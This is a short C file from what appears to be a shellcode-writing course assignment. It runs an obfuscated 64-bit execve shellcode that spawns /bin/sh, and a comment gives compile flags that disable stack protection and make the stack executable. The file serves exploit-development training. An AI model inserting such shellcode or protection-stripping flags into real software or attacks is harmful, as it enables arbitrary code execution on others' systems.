// Student ID   : SLAE64-1611
// Student Name : Jonathan "Chops" Crosby
// Assignment 6 : Shell Code Test File
// File Name    : execve.c

#include<stdio.h>
#include<string.h>

//compile with: gcc execve.c -o execve -fno-stack-protector -z execstack -no-pie

unsigned char code[] = \
"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x28\x73\x50\x48\xc1\xeb\x08\x53\x80\x44\x24\x06\x18\x80\x44\x24\x04\x07\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

main()
{
	printf("Shellcode Length:  %zu\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
